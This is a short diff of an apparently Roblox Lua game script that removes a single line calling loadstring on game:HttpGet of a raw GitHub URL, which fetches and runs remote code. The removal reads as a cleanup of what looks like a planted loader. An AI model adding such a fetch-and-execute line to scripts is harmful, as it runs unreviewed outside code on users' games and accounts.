@@ -957,5 +957,3 @@ player.CharacterAdded:Connect(function(char)
 end)
 
 if player.Character then bindHumanoidDeath(player.Character) end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShockerLL22/spts-classic-main/refs/heads/main/void.lua"))()
-
